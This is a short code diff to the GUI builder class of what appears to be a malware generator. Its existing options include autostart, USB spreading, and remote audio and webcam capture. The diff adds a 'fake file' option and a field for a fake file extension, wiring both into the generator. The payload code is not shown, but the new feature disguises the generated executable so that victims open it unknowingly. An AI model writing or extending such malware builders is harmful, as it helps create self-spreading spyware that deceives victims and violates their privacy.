@@ -103,6 +103,15 @@ class Builder(QWidget, builderUi):
         else:
             return False
 
+    def check_fake_file(self):
+        if self.FakeGroup.isChecked():
+            return True
+        else:
+            return False
+
+    def check_fake_name(self):
+        return str(self.fakeFileExtension.text())
+
     def check_remote_audio(self):
         if self.remoteAudioCheck.isChecked():
             return True
@@ -125,6 +134,8 @@ class Builder(QWidget, builderUi):
         generator.set_file_name(self.check_file_name())
         generator.use_autostart(self.check_autorun())
         generator.use_usb_spreading(self.check_usb_spreading())
+        generator.use_fake_file(self.check_fake_file())
+        generator.set_fake_file_name(self.check_fake_name())
         generator.use_audio(self.check_remote_audio())
         generator.use_webcam(self.check_remote_webcam())
 
